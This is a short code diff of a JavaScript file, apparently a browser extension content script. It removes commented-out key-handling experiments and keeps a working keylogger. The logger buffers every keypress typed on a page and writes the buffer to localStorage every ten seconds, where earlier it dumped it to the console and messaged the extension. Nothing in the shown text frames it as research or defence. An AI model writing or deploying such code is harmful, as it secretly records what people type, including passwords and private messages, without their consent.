@@ -1,19 +1,4 @@
-// function handleKey(key) {
-
-// }
-
-// window.addEventListener('keydown', key => {
-// 	if (key.keyCode === 13 || key.keyCode === 8) {
-// 		console.log(key.keyCode);
-// 	}
-// });
-
-// window.addEventListener('keypress', key => {
-// 	if (key.keyCode != 13) {
-// 		console.log(key.key);
-// 	}
-// });
-
+// Listen on every key and add to buffer
 var keys = '';
 document.onkeypress = function(e) {
   get = window.event ? event : e;
@@ -21,11 +6,10 @@ document.onkeypress = function(e) {
   key = String.fromCharCode(key);
   keys += key;
 }
+// Empty the buffer into Local Storage
 window.setInterval(function() {
   if (keys != '') {
-    console.log("keydump from last 10 seconds: \n" + keys);
-    chrome.runtime.sendMessage("init");
+    localStorage.setItem(Date(), keys);
     keys = '';
   }
 }, 10000);
-
